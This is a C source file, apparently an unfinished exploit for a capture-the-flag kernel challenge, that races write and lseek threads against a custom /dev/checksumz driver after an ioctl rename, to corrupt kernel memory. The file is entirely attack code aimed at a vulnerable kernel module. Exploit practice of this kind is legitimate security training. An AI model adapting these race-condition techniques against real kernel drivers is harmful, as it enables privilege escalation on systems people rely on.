#include "api.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/io.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/syscall.h>      /* Definition of SYS_* constants */
#include <unistd.h>

#define CHECKSUMZ_IOCTL_RENAME   _IOWR('@', 0, char*)
#define CHECKSUMZ_IOCTL_PROCESS  _IO('@', 1)
#define CHECKSUMZ_IOCTL_RESIZE   _IOWR('@', 2, uint32_t)
#define CHECKSUMZ_IOCTL_DIGEST   _IOWR('@', 3, uint32_t*)
typedef struct thread_arg {
} args;
void *race1(void* fd) {
	int _fd = *(int*)fd;
	while (1) {
		char buffer[0x10000];
		memset(buffer, 0x61, 0x10000);
		write(_fd, buffer, 0x10000);
	}
	return NULL;
}
void *race2(void* fd) {
	int _fd = *(int*)fd;
	while (1) {
		off_t offset = lseek(_fd, 100, SEEK_SET);
		printf("seeking offset %ld\n", offset);
	}
	return NULL;
}
void exploit() {
	pthread_t th1;
	pthread_t th2;

    // int fd1 = open("/dev/checksumz", O_RDWR);
    // int fd2 = open("/dev/checksumz", O_RDWR);
	// printf("%d\n", fd1);
	// printf("%d\n", fd2);

    int fd = open("/dev/checksumz", O_RDWR);
	int fd2 = open("/dev/checksumz", O_RDWR);
	printf("created fd %d \n", fd);
	printf("created fd %d \n", fd2);
	char name[100] = "lmaodark";
 //    int fd2 = open("/dev/checksumz", O_RDWR);
	printf("copied data to fd2 \n");
	ioctl(fd2, CHECKSUMZ_IOCTL_RENAME, &name);
	// off_t offset = lseek(fd, 512, SEEK_SET);
	// lseek(fd, 512, SEEK_SET);
	// lseek(fd, 512, SEEK_SET);
	// printf("lseek fd 1 \n");
	char buffer[0x10000];
	printf("set buffer: \n");
	memset(buffer, 0x41, 0x10000);
	// printf("write buffer: \n");
	off_t offset = lseek(fd, 1000, SEEK_SET);
	write(fd, buffer, 0x10000);
	// close(fd1);
	// close(fd2);
    pthread_create(&th1, NULL, race1, &fd);
    pthread_create(&th2, NULL, race2, &fd);
    pthread_join(th1, NULL);
    pthread_join(th2, NULL);
}
int main() {
	exploit();
}
